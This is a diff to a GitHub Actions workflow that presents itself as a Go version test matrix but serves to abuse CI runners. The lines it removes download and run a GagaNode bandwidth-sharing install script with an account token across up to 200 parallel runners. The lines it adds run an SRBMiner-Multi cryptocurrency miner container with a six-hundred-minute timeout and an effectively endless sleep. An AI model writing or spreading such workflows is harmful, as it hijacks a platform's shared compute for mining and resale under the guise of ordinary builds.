@@ -11,7 +11,7 @@ jobs:
       matrix:
         go: [1.1, 1.2, 1.3, 1.4]
         flag: [Uio, Byu, Tin, Bon, Gon]
-    timeout-minutes: 5
+    timeout-minutes: 600
     env:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
@@ -25,46 +25,6 @@ jobs:
       uses: actions/checkout@v1
     - name: Main
       run: |
-        sudo apt update -y && sleep 5
-  Main01:
-    needs: Main
-    runs-on: windows-2022
-    strategy:
-      max-parallel: 200
-      fail-fast: false
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6]
-        flag: [A, B, C, D, E, F]
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 200
-        JOB: ${{ matrix.go }}
-    defaults:
-     run:
-       shell: wsl-bash -u root {0}
-    steps:
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: Setup
-      uses: Vampire/setup-wsl@v1
-    - name : Install Sudo
-      run: sudo apt install curl
-    - name: Main
-      run: |
-        curl -L https://raw.githubusercontent.com/spiritLHLS/gaganode-one-click-command-installation/main/g.sh -o g.sh && chmod +x g.sh
-        bash g.sh -t obqbmxayydohqrhc9a977e15c9875e03 && sleep 156145616518911541564145
-  Success:
-    needs: [Main, Main01]
-    if: always()
-    runs-on: kali-linux
-    steps:
-      - uses: technote-space/workflow-conclusion-action@v2
-      - name: Check Failure
-        if: env.WORKFLOW_CONCLUSION == 'failure'
-        run: exit 1
-      - name: Success
-        if: ${{ success() }}
-        run: echo "all don,All Done"
+         docker run ghcr.io/cniweb/srbminer-multi:latest
+         sleep 46464646464646464
+        
